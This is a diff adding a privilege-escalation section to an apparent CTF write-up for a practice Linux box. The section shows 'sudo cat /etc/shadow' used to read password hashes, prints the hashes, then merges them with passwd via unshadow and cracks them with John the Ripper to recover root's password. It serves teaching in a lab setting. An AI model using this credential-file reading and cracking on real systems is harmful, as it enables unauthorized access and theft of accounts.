@@ -297,7 +297,7 @@ $ ssh -i id_rsa john@<IP_Address>
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-Permissions 0664 for './Downloads/id_rsa' are too open.
+Permissions 0664 for 'id_rsa' are too open.
 It is required that your private key files are NOT accessible by others.
 This private key will be ignored.
 Load key "id_rsa": bad permissions
@@ -366,6 +366,113 @@ The web flag was found right when we logged in to the admin panel on the website
 ## Privilege Escalation
 
 ### Root's Password
+
+One of the commands we should run as soon as we get into a system is ```sudo -l```, this will list all sudo permissions for the current user.
+
+```
+john@bruteit:~$ sudo -l
+
+Matching Defaults entries for john on bruteit:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat
+```
+
+We can see that the user John has the ability to run the ```cat``` command as sudo without a password. This means we can read any file and naturally the first thing we may want to read is the ```shadow``` file which is where users password hashes are stored.
+
+```
+john@bruteit:~$ sudo cat /etc/shadow
+
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+daemon:*:18295:0:99999:7:::
+bin:*:18295:0:99999:7:::
+sys:*:18295:0:99999:7:::
+sync:*:18295:0:99999:7:::
+games:*:18295:0:99999:7:::
+man:*:18295:0:99999:7:::
+lp:*:18295:0:99999:7:::
+mail:*:18295:0:99999:7:::
+news:*:18295:0:99999:7:::
+uucp:*:18295:0:99999:7:::
+proxy:*:18295:0:99999:7:::
+www-data:*:18295:0:99999:7:::
+backup:*:18295:0:99999:7:::
+list:*:18295:0:99999:7:::
+irc:*:18295:0:99999:7:::
+gnats:*:18295:0:99999:7:::
+nobody:*:18295:0:99999:7:::
+systemd-network:*:18295:0:99999:7:::
+systemd-resolve:*:18295:0:99999:7:::
+syslog:*:18295:0:99999:7:::
+messagebus:*:18295:0:99999:7:::
+_apt:*:18295:0:99999:7:::
+lxd:*:18295:0:99999:7:::
+uuidd:*:18295:0:99999:7:::
+dnsmasq:*:18295:0:99999:7:::
+landscape:*:18295:0:99999:7:::
+pollinate:*:18295:0:99999:7:::
+thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
+sshd:*:18489:0:99999:7:::
+john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
+```
+
+We can crack these hashes with ```JohnTheRipper``` again. Copy the output from running ```cat /etc/shadow``` and save the file as [shadow.txt](./Assets/shadow.txt "Shadow File"). In order for the ```john``` tool to crack these hashes we'll need to couple the ```shadow``` file with the ```passwd``` file, so you'll need to copy the output from running the ```cat /etc/passwd``` file and save it as [passwd.txt](./Assets/passwd.txt "Passwd File").
+
+Now that we've got our [shadow.txt](./Assets/shadow.txt "Shadow File") and 
+[passwd.txt](./Assets/passwd.txt "Passwd File") files we can couple them together by using the ```unshadow``` tool from ```JohnTheRipper```. We can do this by using the following command...
+
+```unshadow passwd.txt shadow.txt > unshadowed.txt```
+
+This will merge the two files and save the output as [unshadowed.txt](./Assets/unshadowed.txt "Unshadowed Text File") which looks like the following...
+
+```
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:0:0:root:/root:/bin/bash
+daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:*:2:2:bin:/bin:/usr/sbin/nologin
+sys:*:3:3:sys:/dev:/usr/sbin/nologin
+sync:*:4:65534:sync:/bin:/bin/sync
+games:*:5:60:games:/usr/games:/usr/sbin/nologin
+man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
+news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
+list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:*:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:*:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:*:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:*:103:107::/nonexistent:/usr/sbin/nologin
+_apt:*:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:*:105:65534::/var/lib/lxd/:/bin/false
+uuidd:*:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:*:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:*:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:*:109:1::/var/cache/pollinate:/bin/false
+thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:1000:1000:THM Room:/home/thm:/bin/bash
+sshd:*:110:65534::/run/sshd:/usr/sbin/nologin
+john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:1001:1001:john,,,:/home/john:/bin/bash
+```
+
+Now we can crack the [unshadowed.txt](./Assets/unshadowed.txt "Unshadowed Text File") file with ```JohnTheRipper```.
+
+```
+$ john --wordlist=/path/to/wordlist unshadowed.txt
+
+Loaded 3 password hashes with 3 different salts (crypt, generic crypt(3) [?/64])
+
+Press 'q' or Ctrl-C to abort, almost any other key for status
+football         (root)
+```
+
+After the hashes have been cracked we can see that the password for root was ```football```.
 
 ### Root Flag
 
